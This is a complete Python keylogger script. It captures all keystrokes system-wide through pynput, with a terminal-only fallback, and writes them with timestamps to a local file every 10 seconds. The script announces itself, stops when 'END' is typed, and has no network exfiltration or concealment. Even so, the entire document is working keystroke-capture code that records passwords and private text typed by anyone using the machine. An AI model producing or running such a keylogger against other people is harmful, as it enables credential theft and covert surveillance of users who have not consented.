#!/usr/bin/env python3
import os
import datetime
import time
import threading
import signal
import atexit

# For system-wide keyboard monitoring
try:
    from pynput import keyboard
    USING_PYNPUT = True
except ImportError:
    print("pynput not available, falling back to terminal input mode")
    import sys
    import termios
    import tty
    USING_PYNPUT = False

# File to save the keystrokes
log_file = "keystrokes.txt"

# Buffer to store keystrokes before writing to file
keystroke_buffer = []
buffer_lock = threading.Lock()
last_write_time = time.time()

# For detecting "END" sequence
end_sequence = []
running = True

def get_timestamp():
    """Return current timestamp in a readable format."""
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def write_buffer_to_file():
    """Write the buffered keystrokes to file in horizontal format."""
    global keystroke_buffer
    
    with buffer_lock:
        if keystroke_buffer:
            timestamp = get_timestamp()
            keystroke_text = "".join(keystroke_buffer)
            
            with open(log_file, "a") as f:
                f.write(f"{timestamp}: {keystroke_text}\n")
            
            # Clear the buffer after writing
            keystroke_buffer = []

def check_end_sequence():
    """Check if the last three characters are 'END'"""
    global end_sequence, running
    
    if len(end_sequence) >= 3:
        last_three = ''.join(end_sequence[-3:]).upper()
        if last_three == "END":
            running = False
            return True
    return False

def buffer_keystroke(key_char):
    """Add keystroke to buffer."""
    global keystroke_buffer, last_write_time, end_sequence
    
    with buffer_lock:
        # Add to buffer
        if isinstance(key_char, str) and len(key_char) == 1:
            keystroke_buffer.append(key_char)
            end_sequence.append(key_char)
            if len(end_sequence) > 3:
                end_sequence.pop(0)
        else:
            # Format special keys
            if key_char == "SPACE":
                keystroke_buffer.append(" ")
                end_sequence.append(" ")
            elif key_char == "ENTER":
                keystroke_buffer.append("\n")
                end_sequence.append("\n")
            elif key_char == "TAB":
                keystroke_buffer.append("\t")
                end_sequence.append("\t")
            elif key_char == "BACKSPACE":
                if keystroke_buffer:
                    keystroke_buffer.pop()
                if end_sequence:
                    end_sequence.pop()
            else:
                keystroke_buffer.append(f"[{key_char}]")
    
    # Check for the END sequence
    check_end_sequence()
    
    # Check if it's time to write to file (every 10 seconds)
    current_time = time.time()
    if current_time - last_write_time >= 10:
        write_buffer_to_file()
        last_write_time = current_time

# PYNPUT IMPLEMENTATION (System-wide)
def on_press(key):
    """Handler for key press events using pynput."""
    global running
    
    if not running:
        return False  # Stop listener
    
    try:
        # Regular character
        key_char = key.char
        buffer_keystroke(key_char)
    except AttributeError:
        # Special key
        key_name = str(key).replace("Key.", "")
        # Map common keys
        if key == keyboard.Key.space:
            buffer_keystroke("SPACE")
        elif key == keyboard.Key.enter:
            buffer_keystroke("ENTER")
        elif key == keyboard.Key.tab:
            buffer_keystroke("TAB")
        elif key == keyboard.Key.backspace:
            buffer_keystroke("BACKSPACE")
        else:
            buffer_keystroke(key_name)
    
    return running  # Continue if running is True

# TERMINAL IMPLEMENTATION (Fallback)
def get_char():
    """Get a single character from standard input."""
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    try:
        tty.setraw(sys.stdin.fileno())
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    return ch

def cleanup():
    """Clean up before exiting."""
    write_buffer_to_file()  # Write any remaining keystrokes
    
    with open(log_file, "a") as f:
        f.write(f"{get_timestamp()}: [INFO] Keylogger stopped\n")
    
    print(f"\nKeylogger stopped. Log saved to {os.path.abspath(log_file)}")
    
    # Restore terminal settings if not using pynput
    if not USING_PYNPUT and 'original_terminal_settings' in globals():
        fd = sys.stdin.fileno()
        termios.tcsetattr(fd, termios.TCSADRAIN, original_terminal_settings)

# Handle Ctrl+C gracefully
def signal_handler(sig, frame):
    global running
    running = False
    cleanup()
    if not USING_PYNPUT:  # Terminal mode requires explicit exit
        sys.exit(0)

# Timer function to ensure buffer is written periodically
def timer_write_buffer():
    global running
    while running:
        time.sleep(10)
        write_buffer_to_file()
        global last_write_time
        last_write_time = time.time()

def main_pynput():
    """Main function using pynput for system-wide monitoring."""
    # Create log file with header
    with open(log_file, "w") as f:
        f.write(f"=== System-wide Keylogger Started {get_timestamp()} ===\n")
    
    print(f"Keylogger started. Logging to {os.path.abspath(log_file)}")
    print("Type 'END' to stop the keylogger.")
    print("Keystrokes will be saved horizontally and updated every 10 seconds.")
    
    # Start timer thread to ensure buffer is written periodically
    timer_thread = threading.Thread(target=timer_write_buffer, daemon=True)
    timer_thread.start()
    
    # Start listening for keystrokes
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
    
    # Final cleanup
    cleanup()

def main_terminal():
    """Main function using terminal input (fallback)."""
    global original_terminal_settings, running
    
    # Save original terminal settings
    fd = sys.stdin.fileno()
    original_terminal_settings = termios.tcgetattr(fd)
    
    # Register cleanup function and signal handler
    atexit.register(cleanup)
    signal.signal(signal.SIGINT, signal_handler)
    
    # Create log file with header
    with open(log_file, "w") as f:
        f.write(f"=== Terminal Keylogger Started {get_timestamp()} ===\n")
    
    print(f"Keylogger started. Logging to {os.path.abspath(log_file)}")
    print("Type 'END' to stop the keylogger.")
    print("Note: This will only capture keystrokes while this terminal window is in focus.")
    print("Keystrokes will be saved horizontally and updated every 10 seconds.")
    
    # Start timer thread to ensure buffer is written periodically
    timer_thread = threading.Thread(target=timer_write_buffer, daemon=True)
    timer_thread.start()
    
    # Start capturing keystrokes
    while running:
        char = get_char()
        
        # ASCII representation for special characters
        char_code = ord(char)
        if char_code < 32 or char_code == 127:
            char_name = {
                27: 'ESC',
                9: 'TAB',
                13: 'ENTER',
                127: 'BACKSPACE',
                8: 'BACKSPACE',
                32: 'SPACE'
            }.get(char_code, f"CTRL+{chr(char_code + 64)}")
            
            buffer_keystroke(char_name)
        else:
            buffer_keystroke(char)
        
        # Exit if END was typed
        if not running:
            break

if __name__ == "__main__":
    # Register signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    if USING_PYNPUT:
        # Use pynput for system-wide monitoring
        main_pynput()
    else:
        # Check if running in a terminal
        if not sys.stdin.isatty():
            print("This script must be run in a terminal.")
            sys.exit(1)
            
        # Check if running on a UNIX-like system
        if not hasattr(sys, 'stdin') or not hasattr(termios, 'tcgetattr'):
            print("This script requires a UNIX-like environment with termios support.")
            sys.exit(1)
            
        main_terminal()
